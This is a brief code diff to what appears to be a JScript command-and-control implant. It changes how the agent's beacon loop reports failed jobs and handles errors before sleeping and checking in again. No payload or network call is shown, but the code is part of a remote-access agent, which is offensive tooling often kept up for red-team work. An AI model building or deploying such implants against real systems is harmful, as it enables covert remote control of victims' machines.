@@ -81,13 +81,11 @@ while (true) {
               }
               response = response + '["' + id + '","' +  results + '"],';
           } catch (e) {
-             response = response + '["' + id + '","' + b64e("Job failed: " + e) + '"],';
+             response = response + '["' + id + '","' + b64e("Job failed: " + e.message) + '"],';
           }
       }
   } catch (e) {
-      response = response + '["{{ check_in_job_id }}"]]'
-      WScript.Sleep(sleep);
-      continue;
+      // caught for reliability
   }
   response = response + '["{{ check_in_job_id }}"]]';
   WScript.Sleep(sleep);
